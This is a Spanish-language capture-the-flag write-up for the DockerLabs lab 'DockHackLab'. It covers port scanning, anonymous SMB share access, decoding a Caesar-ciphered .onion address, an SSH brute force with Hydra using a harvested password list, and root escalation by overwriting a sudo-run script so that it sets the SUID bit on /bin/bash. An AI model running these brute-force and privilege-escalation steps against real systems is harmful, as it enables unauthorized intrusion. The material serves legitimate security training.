<img width="890" height="441" alt="image" src="https://github.com/user-attachments/assets/fe289a65-1022-44a6-ba87-8758bd64dec2" />

# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: hard](https://img.shields.io/badge/Dificultad-hard-%23FF0000?style=for-the-badge)

# Fase 1 : Descubrimiento de Superficie (Fast Discovery)

Esta fase tiene como objetivo identificar el vector de ataque en segundos, escaneando el espectro completo de puertos (65,535).
 
 ```ruby
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

`-p- / --open`: Cobertura total del rango TCP. Al filtrar solo por puertos abiertos, optimizo el análisis posterior, ignorando ruido de puertos filtrados por firewalls.

`-sS (Stealth Scan):` Utilizo la técnica de half-open (SYN) para identificar puertos sin completar el Three-Way Handshake de TCP. Esto acelera el proceso y evita que muchas aplicaciones logueen una conexión completa.

`--min-rate 5000:` Ajuste de agresividad para el control de congestión. Al emitir 5000 paquetes por segundo, reduzco un escaneo que podría tardar minutos a escasos segundos.

`-n / -Pn:` Evasión de latencia. Desactivo la resolución DNS inversa y el chequeo ICMP (Ping) para evitar falsos negativos en hosts que bloquean ecos de ping o retrasos por resolución de nombres.

`-vvv:` Triple Verbosity para obtener feedback inmediato. En operaciones reales, esto permite identificar vectores mientras el escaneo aún está en ejecución.

# Fase 1.2: Análisis Forense de Servicios (Targeted Enumeration)

Una vez definida la superficie, realizo una inspección profunda solo en los puntos de entrada confirmados. Esto evita el escaneo innecesario de puertos cerrados con scripts pesados.
```ruby
nmap -sCV -p<PORTS> <IP>
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 17:51 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:df:30:8b:17:c5:3c:80:1c:88:f1:f8:c0:ac:cc:fa (ECDSA)
|_  256 aa:6a:33:65:fc:54:b7:8f:98:ff:1f:3d:79:a3:05:3c (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-03-02T22:51:47
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
```

`-sV (Version Detection):` Interrogación de banners y análisis de respuestas para determinar versiones exactas de software. Esto es vital para identificar vulnerabilidades específicas (CVEs) asociadas a versiones obsoletas.

`-sC (Default Scripts):` Ejecución de scripts en Lua (NSE) para automatizar tareas de reconocimiento avanzado, como detección de vulnerabilidades conocidas, configuraciones por defecto inseguras o enumeración de directorios HTTP.

`-p<PORTS>:` Segmentación del objetivo. Al especificar solo los puertos descubiertos en la Fase 1, se garantiza un uso óptimo del ancho de banda y del tiempo del auditor.

Tras el escaneo de red, se identifica el servicio SMB (Server Message Block) expuesto. Procedo con la fase de enumeración de recursos compartidos (shares) para identificar posibles vectores de exposición de información, configuraciones de seguridad débiles o permisos de lectura/escritura para usuarios no autenticados (Null Sessions).

# .📂 Fase de Enumeración de Recursos Compartidos (SMB)

Tras confirmar que el puerto 445 (TCP) se encuentra expuesto, el siguiente paso táctico es identificar los recursos compartidos (shares) disponibles. Para ello, utilizo smbclient, una herramienta fundamental para interactuar con servidores SMB en entornos Linux.

1. Identificación de Shares (Null Session Check)Primero, intento una Null Session (sesión nula). Esto sirve para verificar si el servidor permite listar recursos sin proporcionar credenciales válidas, un fallo común de configuración.Bash# Listar recursos compartidos de forma anónima
```ruby```
smbclient -L //<IP>/ -N
ParámetroFunción

`-L(List)` Solicita la lista de recursos compartidos del servidor.
`-N(No pass)` Indica a la herramienta que no solicite una contraseña (intento de acceso anónimo).2. Acceso al Recurso IdentificadoTras listar los recursos, Vemos que hay un recurso compartido llamado darkshare y nos deja enumerar de forma anonima, por lo que vamos a ver si nos deja entrar de forma anonima al recurso compartido:
```
smbclient //<IP>/darkshare -N
```
Una vez dentro de la consola interactiva de smbclient, utilizo comandos tipo FTP `(ls, cd, get)` para exfiltrar archivos de interés que puedan contener vectores de escalada de privilegios o credenciales.

Si ejecutamos esto nos dejara entrar, si listamos el recurso compartido con un `ls`:
```ruby
smb: \> ls
  .                                   D        0  Sat Dec 14 05:24:32 2024
  ..                                  D        0  Sat Dec 14 05:24:32 2024
  archivesDatabases.txt               N      563  Sat Dec 14 05:16:30 2024
  ilegal.txt                          N      204  Sat Dec 14 05:24:32 2024
  drugs.txt                           N      526  Sat Dec 14 05:17:49 2024
  credentials.txt                     N      631  Sat Dec 14 05:17:13 2024
  hackingServices.txt                 N      662  Sat Dec 14 05:18:19 2024
```

# 📄 Exfiltración y Análisis de EvidenciasTras
establecer la sesión en el servicio SMB, procedo a inspeccionar el contenido del recurso compartido. Entre los archivos disponibles, destaca uno por su nomenclatura: `ilegal.txt.1`. 

Transferencia de archivos

Utilizo el comando interno de smbclient para transferir el archivo a mi máquina local para un análisis forense más detallado:
```ruby
Bashsmb> get ilegal.txt
```
#  Criptoanálisis:
Identificación del Cifrado César
Al inspeccionar el contenido del archivo, observo un mensaje aparentemente aleatorio pero que mantiene la estructura sintáctica del lenguaje humano. Además, se incluye una nota crítica:` #NOTE:use 5, you understand me.Mensaje original:St qj htrufwyfx jxyf uflnsf f sfinj, xtqt vznjwt vzj qt ajfx yz, df vzj jxyt rj uzjij rjyjw jq uwtgqjrfx...`
Deducción técnica:
La nota sugiere un desplazamiento (offset) de 5 posiciones.
Basándome en la frecuencia de caracteres y la estructura, determino que se trata de un Cifrado César (Rotational Cipher). En lugar de usar herramientas web básicas, este tipo de tareas pueden resolverse rápidamente mediante lógica de rotación de caracteres.
3. Desencriptación del mensaje
4. Aplicando un desplazamiento de `$n=5$` hacia atrás en el alfabeto, logramos obtener el texto en claro:
5. Texto Cifrado:`St qj htrufwyfx...`
6. Texto Descifrado: `No le compartas esta pagina a nadie, solo quiero que lo veas tu, ya que esto me puede meter el problemas: l2fhivsrcbyt2nu5rilmvmqmhpzhugai5szrmyrsyboykzvsokfd6did.onion4. `
7. Identificación del Vector de Acceso `(Deep Web)`  resultado revela una URL con extensión .onion, lo que indica que el siguiente paso del vector de ataque se encuentra alojado en la red Tor `(The Onion Router)` .Para interactuar con este servicio y garantizar el anonimato y la accesibilidad al dominio, procedo con la instalación y configuración del Tor Browser en mi entorno de trabajo. Este hallazgo sugiere que el objetivo utiliza servicios ocultos para evadir la indexación de buscadores convencionales y ocultar infraestructura crítica.


# 3. Acceso mediante Red Tor y OSINT
Para acceder al dominio .onion, despliego el navegador Tor de forma local:

```Bash
tar -xf tor-browser-linux-x86_64-14.0.3.tar.xz
cd tor-browser/ && chmod +x start-tor-browser && ./start-tor-browser
```
Inteligencia en la Deep Web

Navegando por el portal `Dark Forum`, accedo al chat de redroom 27 y obtengo el perfil del objetivo:

Username: `dark` | IP: `192.168.1.105`

En el apartado Hidden Marketplace, localizo una lista de contraseñas que almaceno en dic.txt:

Contenido de dic.txt:
```
dark!6669, h@ck3r_p@ss, 1234deadbeef, q9jp3o8gxr#4, tr1cked43x!, a9x$e5f!th, sl@ve2the$y$tem, k!ll3rbl00d#10, f0rg3tt1ng#ev3r, @rchetype#22, enigm@t1c_4c1d, #chronic_6j23, W!nT3rR1d3r!, 5hadowhunter_99, t3mpor@l_hack!, blind_h@cker#17, C0mp1lex$24, f@1l1ngDarkn3ss, 4llC0ntr0lsf0rmed, deadc0d3!666, W1nt3rCh3ckmate_, xX_b@ckd00r_Xx, h@ck1ng_$p@wn, K0rruptedRoot!02, s1l3nce!000, ~n0_1ntrus1on~, d4rkw@ves_@_88, co_d3mned_h@ck, p!p3l0w1n$h@ck, 56r!m_revelation, DarkKnight99!____, oniondarkgood, Th3%_1nvis1bl3, ph0rce_breach!X9, pr0xys3v3r!x17, kn0ck3rd00r#!23, f3ars_th3_sh@d0w, 3vil_und3rworld!, 8n1ghtm@r3_p@ss, p@ssw0rddark!04, h@x0r_5kyline#44, @9gr34t_0verl0rd, subtr@ct0r_ninja, r!p_@_fakeb@by, cl@nd3st!n3_2_0, 777_n3ver_ch@ng3, b!llyh@cker2024, 4lph@_surviv0r, Blackout!eXodus22, 666root_!3, B@d#@ss__sh3l!11

```
$ 4. Intrusión Inicial (SSH Bruteforce)
Utilizo Hydra para validar las credenciales contra el servicio SSH:

```Bash
hydra -l dark -P dic.txt ssh://<IP> -t 64
```

`Resultado: login:` dark password: oniondarkgood

Accedo al sistema y recupero la flag de usuario:

```Bash
ssh dark@<IP>
cat user.txt # Flag: 2eedcb4e067f16aa9c795fd05f3056bd
```
# 5. Escalada de Privilegios
Tras analizar los privilegios del sistema con `sudo -l`, identifico un vector de ejecución:

`Permiso:` (ALL : ALL) NOPASSWD: /home/dark/hidden.py

`Análisis de Hijacking`
El script de Python `hidden.py` ejecuta de forma interna un script de Bash:
`script_path = '/usr/local/bin/Update.sh'`

Al revisar los permisos de la carpeta `/usr/local/bin/`, detecto que mi usuario tiene permisos de escritura sobre el directorio `(drwxrwx--- 1 root dark)`.

# Explotación del Vector SUID
Procedo a eliminar el archivo original y suplantarlo con uno que asigne el bit SUID a /bin/bash:

```Bash
rm /usr/local/bin/Update.sh
nano /usr/local/bin/Update.sh
```
# Contenido del nuevo Update.sh:
```ruby
#!/bin/bash
chmod u+s /bin/bash
```
Ejecuto el script con privilegios de sudo para activar el cambio:

```Bash
sudo /home/dark/hidden.py
```
Compromiso Total (Root)
Verifico la modificación de permisos en la bash y ejecuto la shell preservando privilegios:

```Bash
-rwsr-xr-x 1 root root ... /bin/bash
bash -p
# Whoami: root
cat /root/root.txt # Flag: dee080ee744e9fb38952f236457f543b
```





